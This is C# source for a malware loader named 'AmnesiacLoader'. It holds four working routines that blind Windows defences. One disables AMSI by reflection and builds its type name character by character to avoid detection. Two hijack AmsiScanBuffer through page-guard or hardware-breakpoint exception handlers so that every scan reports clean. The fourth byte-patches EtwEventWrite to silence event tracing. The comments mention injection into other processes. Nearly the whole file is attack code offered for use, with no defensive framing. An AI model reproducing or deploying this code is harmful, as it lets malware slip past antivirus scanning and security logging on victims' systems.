// AmnesiacLoader — AMSI/ETW Bypass Methods
// PatchAmsiPageGuard:          PAGE_GUARD + VEH on AmsiScanBuffer (no byte modification)
// PatchAmsiHardwareBreakpoint: DR0 hardware breakpoint + VEH on AmsiScanBuffer
// PatchEtwEventWrite:          Byte-patch EtwEventWrite to xor eax,eax + ret

using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace AmnesiacLoader
{
    public class Bypass
    {
        // VirtualProtect constants
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint PAGE_READWRITE    = 0x04;
        const uint PAGE_GUARD        = 0x100;

        // Thread access rights
        const uint THREAD_SUSPEND_RESUME = 0x0002;
        const uint THREAD_GET_CONTEXT    = 0x0008;
        const uint THREAD_SET_CONTEXT    = 0x0010;

        // Exception codes
        const int STATUS_GUARD_PAGE_VIOLATION  = unchecked((int)0x80000001);
        const int EXCEPTION_SINGLE_STEP        = unchecked((int)0x80000004);
        const int EXCEPTION_CONTINUE_EXECUTION = -1;
        const int EXCEPTION_CONTINUE_SEARCH    = 0;

        // x64 CONTEXT structure field offsets
        const int CTX_FLAGS = 0x30;
        const int CTX_DR0   = 0x48;
        const int CTX_DR6   = 0x68;
        const int CTX_DR7   = 0x70;
        const int CTX_RAX   = 0x78;
        const int CTX_RSP   = 0x98;   // RSP at 0x98 in x64 CONTEXT (0xF0 is R15)
        const int CTX_RIP   = 0xF8;
        const int CTX_SIZE  = 0x4D0;

        const int CONTEXT_DEBUG_REGISTERS = 0x00100010;

        // Static references kept alive to prevent GC of delegates
        static IntPtr _amsiScanBuffer = IntPtr.Zero;
        static VectoredExceptionHandler _pageGuardHandler;
        static VectoredExceptionHandler _hwbpHandler;

        delegate int VectoredExceptionHandler(IntPtr exceptionInfo);

        [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hMod, string proc);
        [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
        [DllImport("kernel32.dll")] static extern IntPtr AddVectoredExceptionHandler(uint first, VectoredExceptionHandler handler);
        [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
        [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
        [DllImport("kernel32.dll")] static extern uint SuspendThread(IntPtr thread);
        [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr thread);
        [DllImport("kernel32.dll")] static extern bool GetThreadContext(IntPtr thread, IntPtr ctx);
        [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr thread, IntPtr ctx);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);

        // ── PatchAmsiReflection ───────────────────────────────────────────────────
        // Safe from managed code. No VEH, no native exceptions, no CLR re-entrancy.
        // Mirrors the PS field-enum technique but pre-compiled — AMSI never sees
        // the type name or field names since they live in compiled bytecode, not
        // script text. Loaded via [Reflection.Assembly]::Load(bytes) which AMSI
        // does not scan.

        public static void PatchAmsiReflection()
        {
            try
            {
                // Build type name from chars — no literal string in the PE file
                var typeName = new string(new char[] {
                    'S','y','s','t','e','m','.','M','a','n','a','g','e','m','e','n','t','.',
                    'A','u','t','o','m','a','t','i','o','n','.','A','m','s','i','U','t','i','l','s'
                });

                // Find SMA assembly without a string literal for its name
                System.Reflection.Assembly smaAsm = null;
                foreach (var asm in AppDomain.CurrentDomain.GetAssemblies())
                {
                    var fn = asm.FullName;
                    if (fn != null && fn.Length > 10 && fn[0] == 'S' && fn.IndexOf("Automation") >= 0)
                    { smaAsm = asm; break; }
                }
                if (smaAsm == null) return;

                var t = smaAsm.GetType(typeName);
                if (t == null) return;

                var bf = System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static;
                foreach (var f in t.GetFields(bf))
                {
                    if (f.FieldType == typeof(bool))
                        f.SetValue(null, true);
                    else if (f.FieldType == typeof(IntPtr))
                        f.SetValue(null, IntPtr.Zero);
                }
            }
            catch { }
        }

        // ── PatchAmsiPageGuard ────────────────────────────────────────────────────
        // WARNING: crashes in managed/.NET context. The CLR cannot safely re-enter
        // managed execution from a VEH handler that fires during managed code.
        // Use PatchAmsiReflection() instead. Kept for native injection scenarios
        // where the DLL is loaded into a non-.NET process (e.g., via dllmain.cpp).

        public static void PatchAmsiPageGuard()
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero) return;
            _amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
            if (_amsiScanBuffer == IntPtr.Zero) return;

            _pageGuardHandler = new VectoredExceptionHandler(PageGuardVehHandler);
            AddVectoredExceptionHandler(1, _pageGuardHandler);

            uint old;
            VirtualProtect(_amsiScanBuffer, (UIntPtr)1, PAGE_EXECUTE_READ | PAGE_GUARD, out old);
        }

        static unsafe int PageGuardVehHandler(IntPtr exceptionInfo)
        {
            // EXCEPTION_POINTERS: [0] = PEXCEPTION_RECORD, [8] = PCONTEXT
            byte* ep = (byte*)exceptionInfo.ToPointer();
            byte* er = (byte*)(*(IntPtr*)ep);
            int   code    = *(int*)er;
            IntPtr excAddr = *(IntPtr*)(er + 0x10);

            if (code == STATUS_GUARD_PAGE_VIOLATION && excAddr == _amsiScanBuffer)
            {
                byte* ctx = (byte*)(*(IntPtr*)(ep + 8));

                // Set return value RAX = 0 (HRESULT S_OK)
                *(long*)(ctx + CTX_RAX) = 0;

                // Set *result = AMSI_RESULT_CLEAN (1)
                // x64 calling convention: 6th argument at [RSP+0x30]
                long rsp = *(long*)(ctx + CTX_RSP);
                IntPtr resultPtr = *(IntPtr*)(rsp + 0x30);
                if (resultPtr != IntPtr.Zero)
                    *(int*)resultPtr = 1;

                // Skip the function body: RIP = [RSP] (return addr), RSP += 8
                *(long*)(ctx + CTX_RIP) = *(long*)rsp;
                *(long*)(ctx + CTX_RSP) = rsp + 8;

                // Re-apply PAGE_GUARD so subsequent calls are also intercepted
                uint oldProt;
                VirtualProtect(_amsiScanBuffer, (UIntPtr)1, PAGE_EXECUTE_READ | PAGE_GUARD, out oldProt);

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }

        // ── PatchAmsiHardwareBreakpoint ───────────────────────────────────────────

        public static void PatchAmsiHardwareBreakpoint()
        {
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            if (amsiDll == IntPtr.Zero) return;
            _amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
            if (_amsiScanBuffer == IntPtr.Zero) return;

            // Register VEH before setting DR0 so the handler is ready when the bp fires
            _hwbpHandler = new VectoredExceptionHandler(HwbpVehHandler);
            AddVectoredExceptionHandler(1, _hwbpHandler);

            // Set DR0 on the calling thread via a helper thread that suspends it
            uint   mainTid    = GetCurrentThreadId();
            IntPtr mainThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, false, mainTid);
            if (mainThread == IntPtr.Zero) return;

            var done = new ManualResetEventSlim(false);
            new Thread(() =>
            {
                SuspendThread(mainThread);

                // Allocate 16-byte-aligned CONTEXT buffer
                IntPtr raw     = Marshal.AllocHGlobal(CTX_SIZE + 16);
                long   aligned = (raw.ToInt64() + 15) & ~15L;
                IntPtr ctx     = new IntPtr(aligned);
                for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, CTX_FLAGS, CONTEXT_DEBUG_REGISTERS);

                GetThreadContext(mainThread, ctx);

                unsafe
                {
                    byte* p = (byte*)ctx.ToPointer();
                    *(long*)(p + CTX_DR0) = _amsiScanBuffer.ToInt64();
                    // Enable local hardware breakpoint 0 (DR7 bit 0 = L0)
                    *(long*)(p + CTX_DR7) = (*(long*)(p + CTX_DR7)) | 1L;
                }

                SetThreadContext(mainThread, ctx);
                Marshal.FreeHGlobal(raw);
                ResumeThread(mainThread);
                CloseHandle(mainThread);
                done.Set();
            }) { IsBackground = true }.Start();

            done.Wait();
        }

        static unsafe int HwbpVehHandler(IntPtr exceptionInfo)
        {
            byte* ep = (byte*)exceptionInfo.ToPointer();
            byte* er = (byte*)(*(IntPtr*)ep);
            int   code    = *(int*)er;
            IntPtr excAddr = *(IntPtr*)(er + 0x10);

            if (code == EXCEPTION_SINGLE_STEP && excAddr == _amsiScanBuffer)
            {
                byte* ctx = (byte*)(*(IntPtr*)(ep + 8));

                *(long*)(ctx + CTX_RAX) = 0; // HRESULT S_OK

                long rsp = *(long*)(ctx + CTX_RSP);
                IntPtr resultPtr = *(IntPtr*)(rsp + 0x30);
                if (resultPtr != IntPtr.Zero)
                    *(int*)resultPtr = 1; // AMSI_RESULT_CLEAN

                *(long*)(ctx + CTX_RIP) = *(long*)rsp;
                *(long*)(ctx + CTX_RSP) = rsp + 8;
                *(long*)(ctx + CTX_DR6) = 0; // clear debug status

                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return EXCEPTION_CONTINUE_SEARCH;
        }

        // ── PatchEtwEventWrite ────────────────────────────────────────────────────

        public static void PatchEtwEventWrite()
        {
            IntPtr ntdll    = LoadLibrary("ntdll.dll");
            if (ntdll == IntPtr.Zero) return;
            IntPtr funcAddr = GetProcAddress(ntdll, "EtwEventWrite");
            if (funcAddr == IntPtr.Zero) return;

            uint old;
            VirtualProtect(funcAddr, (UIntPtr)4, PAGE_READWRITE, out old);
            unsafe
            {
                byte* p = (byte*)funcAddr.ToPointer();
                p[0] = 0x31; p[1] = 0xC0; // xor eax, eax
                p[2] = 0xC3;               // ret
                p[3] = 0x90;               // nop (padding)
            }
            VirtualProtect(funcAddr, (UIntPtr)4, old, out old);
        }
    }
}
